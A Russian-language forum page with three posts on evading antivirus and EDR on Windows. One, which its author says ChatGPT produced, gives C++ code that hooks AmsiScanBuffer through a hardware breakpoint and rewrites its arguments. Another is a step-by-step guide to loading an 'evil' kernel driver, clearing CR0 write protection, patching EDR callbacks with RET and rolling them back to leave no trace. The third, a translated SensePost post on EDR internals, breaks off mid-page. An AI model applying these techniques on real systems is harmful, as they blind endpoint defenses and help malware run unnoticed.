<b>AmsiScanBuffer</b> — это функция из Antimalware Scan Interface (AMSI) в Windows. AMSI предоставляет приложениям и сервисам интерфейс для взаимодействия с антивирусными решениями, установленными на системе. Это позволяет приложениям отправлять буферы данных на сканирование, чтобы определить, содержат ли они вредоносный код или другие угрозы.<br />
<br />
Функция AmsiScanBuffer предназначена для сканирования произвольного буфера памяти. Это может быть полезно, например, для проверки содержимого файлов, сетевых пакетов или динамически генерируемого кода на предмет вредоносных действий.<br />
<br />
Прототип функции выглядит примерно так:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    const void *buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);</code></pre>
	</div>
</div><br />
Описание параметров:<br />
<ul>
<li data-xf-list-type="ul">amsiContext: контекст AMSI, который был получен при вызове AmsiInitialize.</li>
<li data-xf-list-type="ul">buffer: указатель на буфер, который следует просканировать.</li>
<li data-xf-list-type="ul">length: размер буфера в байтах.</li>
<li data-xf-list-type="ul">contentName: опциональное имя или описание контента, который сканируется. Это может помочь антивирусному решению лучше понять, что именно сканируется.</li>
<li data-xf-list-type="ul">amsiSession: опциональная сессия сканирования; может быть NULL.</li>
<li data-xf-list-type="ul">result: указатель на переменную, в которую будет записан результат сканирования.</li>
</ul>Функция возвращает код HRESULT, который указывает на успешность операции или наличие ошибки. Значение, указанное result, будет содержать результат сканирования, например, является ли содержимое буфера безопасным или вредоносным.<br />
<br />
<b>Вот базовый пример на C++, который устанавливает хардверный брейкпоинт на адрес функции AmsiScanBuffer:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C++:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="cpp"><code>#include &lt;Windows.h&gt;
#include &lt;iostream&gt;

void SetHardwareBreakpoint(void* address)
{
    CONTEXT context;
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to get thread context.&quot; &lt;&lt; std::endl;
        return;
    }

    // Set the address into DR0 (debug register 0)
    context.Dr0 = (DWORD_PTR)address;
    context.Dr7 |= 0x00000001;  // Activate DR0 for execution

    if (!SetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to set thread context.&quot; &lt;&lt; std::endl;
    }
}

int main()
{
    HMODULE hAmsi = LoadLibraryA(&quot;amsi.dll&quot;);
    if (!hAmsi)
    {
        std::cerr &lt;&lt; &quot;Failed to load amsi.dll&quot; &lt;&lt; std::endl;
        return 1;
    }

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, &quot;AmsiScanBuffer&quot;);
    if (!pAmsiScanBuffer)
    {
        std::cerr &lt;&lt; &quot;Failed to find AmsiScanBuffer function.&quot; &lt;&lt; std::endl;
        return 1;
    }

    SetHardwareBreakpoint(pAmsiScanBuffer);

    // TODO: Add your code here.

    return 0;
}</code></pre>
	</div>
</div><br />
Этот код устанавливает хардверный брейкпоинт на выполнение функции AmsiScanBuffer. Когда функция будет вызвана, ваше приложение попадет в обработчик исключения (EXCEPTION_SINGLE_STEP). Вы можете обработать это исключение, чтобы выполнить нужные действия при достижении брейкпоинта.<br />
<br />
Чтобы добавить обработчик для функции AmsiScanBuffer, вы можете использовать векторные исключения Windows. Сначала добавьте обработчик исключений, который будет вызываться при срабатывании брейкпоинта, а затем в этом обработчике перехватите вызов AmsiScanBuffer.<br />
<br />
Ниже приведен пример:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C++:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="cpp"><code>#include &lt;Windows.h&gt;
#include &lt;iostream&gt;

LONG CALLBACK VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        // TODO: Обработка вызова AmsiScanBuffer
        // ...
     
        // Верните EXCEPTION_CONTINUE_EXECUTION, чтобы продолжить выполнение
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // Если это не та ошибка, которую мы искали, верните EXCEPTION_CONTINUE_SEARCH.
    return EXCEPTION_CONTINUE_SEARCH;
}

void SetHardwareBreakpoint(void* address)
{
    CONTEXT context;
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to get thread context.&quot; &lt;&lt; std::endl;
        return;
    }

    // Set the address into DR0 (debug register 0)
    context.Dr0 = (DWORD_PTR)address;
    context.Dr7 |= 0x00000001;  // Activate DR0 for execution

    if (!SetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to set thread context.&quot; &lt;&lt; std::endl;
    }
}

int main()
{
    HMODULE hAmsi = LoadLibraryA(&quot;amsi.dll&quot;);
    if (!hAmsi)
    {
        std::cerr &lt;&lt; &quot;Failed to load amsi.dll&quot; &lt;&lt; std::endl;
        return 1;
    }

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, &quot;AmsiScanBuffer&quot;);
    if (!pAmsiScanBuffer)
    {
        std::cerr &lt;&lt; &quot;Failed to find AmsiScanBuffer function.&quot; &lt;&lt; std::endl;
        return 1;
    }

    SetHardwareBreakpoint(pAmsiScanBuffer);

    // Установите векторный обработчик исключений
    AddVectoredExceptionHandler(1, VectoredExceptionHandler);

    // TODO: Add your code here.

    return 0;
}</code></pre>
	</div>
</div><br />
В VectoredExceptionHandler вы можете добавить логику, которая будет выполнена при вызове AmsiScanBuffer. Например, вы можете изменить аргументы, передаваемые в функцию, или модифицировать результаты выполнения.<br />
<br />
Чтобы изменить аргументы функции AmsiScanBuffer в VectoredExceptionHandler, нужно взаимодействовать с контекстом потока, который был передан в обработчик исключений. Аргументы функции передаются через регистры или через стек в зависимости от архитектуры и соглашения вызова. В x64 Windows, первые четыре аргумента функции передаются через регистры RCX, RDX, R8 и R9, а остальные — через стек.<br />
<br />
В контексте функции AmsiScanBuffer:<br />
<ul>
<li data-xf-list-type="ul">RCX будет содержать amsiContext</li>
<li data-xf-list-type="ul">RDX будет содержать указатель на buffer</li>
<li data-xf-list-type="ul">R8 будет содержать length</li>
<li data-xf-list-type="ul">R9 будет содержать contentName</li>
</ul>Остальные аргументы можно получить из стека.<br />
<br />
Вот пример того, как вы можете изменить аргументы:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C++:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="cpp"><code>LONG CALLBACK VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        CONTEXT* context = ExceptionInfo-&gt;ContextRecord;

        // Изменяем аргументы функции
        context-&gt;Rcx = (DWORD_PTR)modifiedAmsiContext;
        context-&gt;Rdx = (DWORD_PTR)modifiedBuffer;
        context-&gt;R8 = modifiedLength;
        context-&gt;R9 = (DWORD_PTR)modifiedContentName;

        // Если нужно изменить аргументы в стеке (например, amsiSession или result):
        DWORD_PTR* stack = (DWORD_PTR*)context-&gt;Rsp;
        stack[0] = (DWORD_PTR)modifiedAmsiSession; // Первый аргумент в стеке
        stack[1] = (DWORD_PTR)&amp;modifiedResult;     // Второй аргумент в стеке

        // ...

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}</code></pre>
	</div>
</div><br />
<b>Это статья написана ChatGPT с моими подсказками и наводящими вопросами...)<br />
Круто правда ?</b></div>
						

							<h2>Уклоняемся от поведенческого детекта антивируса и EDR</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746796964029.png"
		data-src="https://osint42.org/attachments/1746796964029-png.334/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796964029-png.334/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796964029.png"
			title="1746796964029.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
Всем привет!<br />
<br />
Давайте поисследуем как можно обойти детект связанный с поведением на конкретном устройстве:<br />
<br />
Вообще тут существуют два варианта обхода:<br />
<br />
<b><u>1)Использовать антихуки в своём приложении</u></b>, этот метод относительно простой и описан уже здесь:Открываем врата ада | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
Или вот ещё проект:Фреймворк для тестирования антивирусов<br />
<br />
Но данный метод не позволяет 100% обойти защиту, т.к. многие  AV используют коллбэки и мини-фильтры ядра.<br />
Тут нужен второй способ, а вообще можно в комплексе использовать.)<br />
<br />
2)Итак второй способ:<br />
<br />
<b><u>Этот способ заключается в удалении калбэков защитного решения в ядре.)</u></b><br />
<br />
Долгое время Microsoft пыталась перенести и ограничить любой сторонний код ring0.<br />
Это делается по понятным причинам, в основном чтобы не позволять сторонним разработчикам вмешиваться в код ядра и избегать предоставления им доступа к обходам защиты ядра KPP (Kernel Patch Protection).<br />
<br />
Из-за этого производители EDR вынуждены использовать другие способы взаимодействия с ядром, а именно коллбэки и мини-фильтры.<br />
Цель драйверов мини-фильтров заключается в перехвате запросов ввода/вывода файловой системы и расширении или замене нативных функциональностей.<br />
Между тем, коллбэки необходимы для перехвата создания процессов/потоков и загрузки образов.<br />
<br />
<b>Итак моему мнению, лучший способ изучить тему - это начать с теории и перейти к чему-то осязаемому</b><br />
<br />
Давайте попробуем на практике, что можно достичь с помощью зловредного драйвера.<br />
<a href="https://github.com/uf0o/windows-ps-callbacks-experiments/tree/master/evil-driver" target="_blank" class="link link--external" rel="noopener">Загрузите копию проекта Visual Studio здесь</a>, скомпилируйте его для x64, режим отладки.<br />
<br />
Режим отладки включит операторы KdPrint и позволит нам наблюдать за поведением драйвера через (DebugView)[<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/debugview" target="_blank" class="link link--external" rel="noopener">DebugView - Sysinternals</a>] от SysInternals или через удаленную сессию ядра WinDbg.<br />
<br />
Успешная компиляция приведет к созданию двух бинарных файлов: интерфейса командной строки пользовательского режима evilcli.exe и самого драйвера evil.sys. Поскольку наш драйвер не подписан, перед установкой, необходимо включить тестовый режим из командной строки с повышенными правами с помощью Bcdedit.exe -set TESTSIGNING ON и перезагрузить машину.<br />
<b><u>Позже мы увидим, как доставить тот же самый драйвер в нормальном сценарии, без включения тестового режима.</u></b><br />
<br />
CLI оборудован следующими опциями:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>C:\Users\matteo\windows-ps-callbacks-experiments-master\evil-driver\x64\Debug&gt;evilcli.exe

Использование: evilcli.exe &lt;опции&gt;

Опции:

-h Показать это сообщение.
-l Список адресов коллбэков уведомлений о процессах, потоках и загрузке образов.

&lt;Коллбэки процессов&gt;

-zp Обнулить массив коллбэков уведомлений о процессах (Режим ковбоя).
-dp &lt;индекс&gt; Удалить конкретный коллбэк уведомления о процессе (Режим красной команды).
-pp &lt;индекс&gt; Исправить конкретный коллбэк уведомления о процессе (Режим угрозы актера).
-rp &lt;индекс&gt; Вернуться к оригинальному коллбэку уведомления о процессе (Режим задумчивого ниндзя).

&lt;Коллбэки потоков&gt;

-zt Обнулить массив коллбэков уведомлений о потоках (Режим ковбоя).
-dt &lt;индекс&gt; Удалить конкретный коллбэк уведомления о потоке (Режим красной команды).
-pt &lt;индекс&gt; Исправить конкретный коллбэк уведомления о потоке (Режим угрозы актера).
-rt &lt;индекс&gt; Вернуться к оригинальному коллбэку уведомления о потоке (Режим задумчивого ниндзя).

&lt;Коллбэки загрузки образов&gt;

-zl Обнулить массив коллбэков уведомлений о загрузке образов (Режим ковбоя).
-dl &lt;индекс&gt; Удалить конкретный коллбэк уведомления о загрузке образа (Режим красной команды).
-pl &lt;индекс&gt; Исправить конкретный коллбэк уведомления о загрузке образа (Режим угрозы актера).
-rl &lt;индекс&gt; Вернуться к оригинальному коллбэку уведомления о загрузке образа (Режим задумчивого ниндзя).</code></pre>
	</div>
</div><br />
Как видите опций много,  поэтому я просто выделю возможность изменения/восстановления исправленного коллбэка с помощью команд rp или rt в зависимости от того, относится ли он к процессу или потоку.<br />
<br />
Мы должны помнить, что эта битва ведется между двумя сущностями, работающими на одном и том же уровне ring0.<br />
<b><u>Так что, как предупреждение, зловредный драйвер будет успешен только на системах без включенного HyperV.<br />
<br />
Если на системе включен HyperV, он обнаружит любые изменения в ядре или драйвере во время выполнения </u></b>и немедленно разрушит наши мечты синим экраном смерти System Service Exception BSOD.<br />
Тем временем, чтобы продолжать играть с нашим драйвером, нам нужно отключить гипервизор с помощью bcdedit /set hypervisorlaunchtype off и перезагрузить систему.<br />
<br />
<b><u>Тем не менее, нам все еще нужно найти метод, чтобы наше изменение ядра могло сосуществовать с KPP</u></b>, также известным как PatchGuard. Короче говоря, KPP пытается предотвратить любые модификации критически важных структур ядра, вызывая проверку на ошибки при любой попытке это сделать.<br />
Тем не менее, эта проверка запускается несинхронизированными таймерами, как уже было задокументировано во многих местах, в частности, на <a href="http://www.uninformed.org/?v=6&amp;a=1&amp;t=sumry" target="_blank" class="link link--external" rel="noopener">uninformed</a> и <a href="https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf" target="_blank" class="link link--external" rel="noopener">tetrane</a>.<br />
<b><u>Мы увидим, как обойти PatchGuard чуть позже.)</u><br />
<br />
Подавление WriteProtect</b><br />
<br />
Препятствие, с которым нам предстоит столкнуться, заключается в том, что наши целевые коллбэки находятся в страницах памяти ядра только для чтения. И эти страницы явно не могут быть модифицированы нашим патчем.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>lkd&gt; !pte 0xfffff80267fdd670
                                           VA fffff80267fdd670
PXE at FFFF85C2E170BF80    PPE at FFFF85C2E17F0048    PDE at FFFF85C2FE0099F8    PTE at FFFF85FC0133FEE8
contains 0000000005108063  contains 0000000005109063  contains 0000000005219063  contains 09000000035C5021
pfn 5108      ---DA--KWEV  pfn 5109      ---DA--KWEV  pfn 5219      ---DA--KWEV  pfn 35c5      ----A--KREV</code></pre>
	</div>
</div><br />
PTE действительно доступна только для чтения (флаг R в ----A--KREV), и если мы настолько упрямы, чтобы вмешиваться в это, мы столкнемся с синим экраном смерти (BSOD).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797096111.png"
		data-src="https://osint42.org/attachments/1746797096111-png.335/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797096111-png.335/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797096111.png"
			title="1746797096111.png"
			width="535" height="386" loading="lazy" />
	</div><br />
<br />
Ну, как же нам сделать нашу страницу доступной для записи? Наш святой Грааль - это регистр CR0, который является одним из других управляющих регистров, отвечающих за определение режима работы процессора и характеристик текущего потока. Бит номер 16 этого регистра - это флаг WP (Write Protect), который нам нужно сбросить. Затем мы &quot;отравляем&quot; 16-й бит CR0, используя следующий MDL (Memory Descriptor List) как структуру для представления разметки регистра.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef union {
    struct {
        UINT64 protection_enable : 1;
        UINT64 monitor_coprocessor : 1;
        UINT64 emulate_fpu : 1;
        UINT64 task_switched : 1;
        UINT64 extension_type : 1;
        UINT64 numeric_error : 1;
        UINT64 reserved_1 : 10;
        UINT64 write_protect : 1;
        UINT64 reserved_2 : 1;
        UINT64 alignment_mask : 1;
        UINT64 reserved_3 : 10;
        UINT64 not_write_through : 1;
        UINT64 cache_disable : 1;
        UINT64 paging_enable : 1;
    };

    UINT64 flags;
} cr0;</code></pre>
	</div>
</div><br />
И удаляем флаг защиты от записи из CR0.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>void CR0_WP_OFF_x64()
{
    cr0 mycr0;
    mycr0.flags = __readcr0();
    mycr0.write_protect = 0;
    __writecr0(mycr0.flags);
}</code></pre>
	</div>
</div><br />
<br />
Не забывая применить изменение на каждом логическом процессоре:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int LogicalProcessorsCount = KeQueryActiveProcessorCount

for (ULONG64 processorIndex = 0; processorIndex &lt; LogicalProcessorsCount; processorIndex++)
{
    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 &lt;&lt; processorIndex));
    CR0_WP_OFF_x64();
    KeRevertToUserAffinityThreadEx(oldAffinity);
}</code></pre>
	</div>
</div><br />
<u><b>Как-же обойти </b></u><b><u><b><u>PatchGuard:</u></b></u></b><br />
<br />
Мы можем построить нашу стратегию модификации структуры данных ядра вокруг следующих пунктов:<br />
<ol>
<li data-xf-list-type="ol">Очистить бит WP на странице только для записи на каждом ядре</li>
<li data-xf-list-type="ol">Сделать наше дело</li>
<li data-xf-list-type="ol">Восстановить бит WP</li>
</ol>Мы могли бы достичь той же синхронизации примитивов:<br />
<br />
Метод заключается в использовании Deferred Procedure Calls (DPC), механизма в ядре Windows, который позволяет отложить выполнение определённых функций до более подходящего времени, когда уровень прерываний (IRQL) позволяет безопасное выполнение этих задач. Используя DPC, мы можем синхронизировать выполнение кода на всех процессорах системы, чтобы временно отключить флаг защиты от записи (WP) в регистре управления CR0 каждого процессора.<b> Это позволяет модифицировать защищённые области памяти ядра, не вызывая обнаружения PatchGuard.<br />
<br />
<u>Как-же загрузить вредоносоный драйвер ?</u></b><br />
<br />
Что если законно подписанный драйвер уязвим для уязвимости типа Write-What-Where, которая позволяет нам перезаписывать пространство памяти ядра и отключить принудительную проверку подписи драйверов?<br />
<br />
На протяжении многих лет это был случай с известным уязвимым драйвером Gigabyte, который использовался для различных целей, от отключения античит-систем видеоигр до вымогательского ПО.<br />
Можно использовать маперы, которые описаны здесь:Дополнительно: Как я RootKit загружал или же как загрузить драйвер без подписи | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
<b><u>Давайте перейдем к практике и попробуем методику описанную выше на примерах:</u></b><br />
<br />
1)Загрузите наш вредоносный драйвер, сделать это можно через маперы, но для теста можно временно отключить проверки цифровой подписи и т.д.:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>sc create evil type= kernel binPath= c:\path\to\file\evildriver.sys
sc start evil</code></pre>
	</div>
</div><br />
2)Взаимодействуйте с зловредным драйвером, проверяя зарегистрированные коллбэки в системе:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>C:\Users\matteo\Desktop\Debug&gt;evilcli.exe -l
[00] 0xfffff8012154a340 (ntoskrnl.exe + 0x34a340)
[01] 0xfffff801250f4dc0 (cng.sys + 0x14dc0)
[02] 0xfffff80125548610 (klupd_klif_arkmon.sys + 0x18610)
[03] 0xfffff80124f3d870 (ksecdd.sys + 0x1d870)
[04] 0xfffff80126390960 (tcpip.sys + 0x60960)
[05] 0xfffff801269ed930 (iorate.sys + 0xd930)
[06] 0xfffff80125067fc0 (CI.dll + 0x77fc0)
[07] 0xfffff80127161600 (klflt.sys + 0x11600)
[08] 0xfffff801272189d0 (dxgkrnl.sys + 0x89d0)
[09] 0xfffff801283d47f0 (kldisk.sys + 0x47f0)
[10] 0xfffff80127ac9e90 (vm3dmp.sys + 0x9e90)
[11] 0xfffff801294e3ce0 (peauth.sys + 0x43ce0)
[12] 0xfffff8012531f9a0 (mssecflt.sys + 0x1f9a0)</code></pre>
	</div>
</div><br />
Отключите нужный коллбэк, разместив инструкцию RET (C3) на том же смещении. Таким образом, коллбэк просто вернётся к вызывающему и пропустит весь последующий код.<br />
<br />
<b><u>Не используйте другие опции (-z или -d), так как они могут повредить систему.</u></b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>C:\Users\matteo\Desktop\Debug&gt;evilcli.exe -p 7
Patching index: 7 with a RET (0xc3)</code></pre>
	</div>
</div><br />
3)Восстановить коллбэк в его исходное состояние после выполнения нужных действий.<br />
<br />
Хоть у большинства антивирусов/EDR нет контроля целостности кода, но лучше перестраховаться, особенно чтобы не оставить следов.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>C:\Users\matteo\Desktop\Debug&gt;evilcli.exe -r 7
Rolling back patched index: 7 to the original values</code></pre>
	</div>
</div><br />
По мотивам этой статьи:<a href="https://www.matteomalvica.com/blog/2020/07/15/silencing-the-edr/" target="_blank" class="link link--external" rel="noopener">Silencing the EDR. How to disable process, threads and image-loading detection callbacks. ::   — uf0</a></div>
						

							<h2>Обходим антивирусы и EDR</h2>

							

							

							<div class="bbWrapper">Оригинал:<a href="https://sensepost.com/blog/2023/filter-mute-operation-investigating-edr-internal-communication/" target="_blank" class="link link--external" rel="noopener">SensePost |   Filter-mute operation: investigating edr internal communication</a><br />
<br />
Для нашей ежегодной внутренней хакерской конференции, которую мы назвали SenseCon в 2023 году, я решил изучить взаимодействие между драйвером Windows и его процессом в пользовательском режиме.<br />
<br />
<b>Вот некоторые подробности об этом путешествии:</b><br />
<br />
Атакующие могут использовать примитив эксплойта чтения/записи ядра Windows, чтобы избежать взаимодействия между EDR_Driver.sys и его EDR_process.exe. В результате некоторые механизмы обнаружения EDR будут отключены, что сделает его (частично) слепым к злонамеренным полезным нагрузкам.<br />
<br />
<b><u>Этот блог описывает альтернативный подход, который не удаляет колбэки ядра и дает некоторые рекомендации по защите от этой атаки &quot;заглушения фильтра&quot;. </u><br />
<br />
Обзор ролей EDR_process.exe и EDR_Driver.sys</b><br />
<br />
Первый вопрос, который приходит на ум, это как приложение EDR (EDR_Process.exe) общается со своим драйвером EDR (EDR_Driver.sys)?<br />
<br />
Прежде чем проводить исследование, нам необходимо знать некоторые основы EDR; как агент EDR внедряет свою собственную DLL в процесс при его создании?<br />
Схема внедрения процесса через колбэки, взятая из наблюдений EDR, <a href="https://signal-labs.com/edr-observations/" target="_blank" class="link link--external" rel="noopener">сделанных Кристофером Веллой, является хорошим резюме.</a><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796764519.png"
		data-src="https://osint42.org/attachments/1746796764519-png.327/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796764519-png.327/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796764519.png"
			title="1746796764519.png"
			width="981" height="814" loading="lazy" />
	</div><br />
<br />
Я добавил некоторые комментарии о том, что происходит:<br />
<ul>
<li data-xf-list-type="ul">EDR_Driver.sys может подписаться на несколько типов уведомлений ядра. Можно представить, что эти уведомления похожи на &quot;рассылки&quot;, на которые вы подписываетесь в Интернете и получаете по электронной почте от веб-сайта. Например, EDR_Driver.sys может подписаться на службу уведомлений о &quot;создании нового процесса&quot;, используя API Windows, названный PsSetCreateProcessNotifyRoutine, после чего, для каждого процесса, созданного системой, драйвер будет получать информацию о нем (родительский PID, командную строку и т.д.)</li>
<li data-xf-list-type="ul">Пользователь дважды кликает по malware.exe</li>
<li data-xf-list-type="ul">Windows вызывает API CreateProcessW для загрузки malware.exe в память</li>
<li data-xf-list-type="ul">EDR_Driver.sys получает уведомление о том, что будет запущен malware.exe.</li>
<li data-xf-list-type="ul">EDR_Driver.sys отправляет лог в EDR_Process.exe с сообщением: &quot;Эй! Скоро будет запущен новый процесс под названием malware.exe.&quot;</li>
<li data-xf-list-type="ul">EDR_process.exe может выбрать действие (или не действовать): &quot;Окей, я буду мониторить этот процесс, создавая хуки в его ntdll.dll&quot;</li>
<li data-xf-list-type="ul">Когда malware.exe запускается, он вызывает API Windows. Благодаря установленным хукам, EDR_Process.exe знает, какие API вызываются, и может выяснить, что делает malware.exe</li>
</ul>В качестве примера malware.exe мы могли бы взять следующий фрагмент кода <a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection" target="_blank" class="link link--external" rel="noopener">с сайта ired.team.</a><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796775302.png"
		data-src="https://osint42.org/attachments/1746796775302-png.328/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796775302-png.328/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796775302.png"
			title="1746796775302.png"
			width="1024" height="695" loading="lazy" />
	</div><br />
<br />
Как только хуки установлены, агент EDR (EDR_process.exe) может мониторить / анализировать malware.exe. Вот пример действий, которые он может предпринять:<br />
<ol>
<li data-xf-list-type="ol">EDR_Process.exe видит следующие вызовы Windows API, которые делает malware.exe:<br />
OpenProcess VirtualAllocEx WriteProcessMemory CreateRemoteThread</li>
<li data-xf-list-type="ol">EDR_Process.exe классифицирует эту последовательность вызовов API как &quot;вредоносную&quot; и блокирует (убивает) процесс.</li>
<li data-xf-list-type="ol">EDR_Process.exe отправляет лог на EDR_C2 (консоль безопасности) с сообщением: &quot;Эй, процесс malware.exe запущен и классифицирован как вредоносный&quot;.</li>
</ol>Примечание: это обычный поток EDR и не единственный способ его работы, например, EDR_Process.exe может отправлять только данные телеметрии и позволять EDR_C2 решить, является ли это вредоносным и какие действия применять (блокировать или нет).<br />
Если поставщик EDR или операторы команды безопасности (известные как blueteam) настроили правило &quot;блокировать, если вредоносно&quot; в Консоли Безопасности EDR, то процесс malware.exe убивается EDR_Process.exe (или EDR_Driver.sys). Также доступны другие контрмеры, например:<br />
<ul>
<li data-xf-list-type="ul">Windows-хост может быть удаленно изолирован от сети</li>
<li data-xf-list-type="ul">файл malware.exe или дамп памяти может быть загружен для анализа / реверсинга</li>
<li data-xf-list-type="ul">аналитик безопасности может выполнять команды на Windows-хосте (из консоли безопасности) для целей расследования</li>
<li data-xf-list-type="ul">…</li>
</ul>Этот момент важен; чем более опытна команда blueteam в создании пользовательских правил, тем сложнее атакующим избежать обнаружения или перемещаться по сети боковым образом без попадания в ловушку!<br />
Теперь, прежде чем углубляться во внутреннее общение, я хочу сделать шаг назад и упростить поведение EDR. Внутреннее общение (синие стрелки) и внешнее общение (желтые стрелки) EDR_Process.exe можно визуализировать с помощью простого обзора:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796787570.png"
		data-src="https://osint42.org/attachments/1746796787570-png.329/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796787570-png.329/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
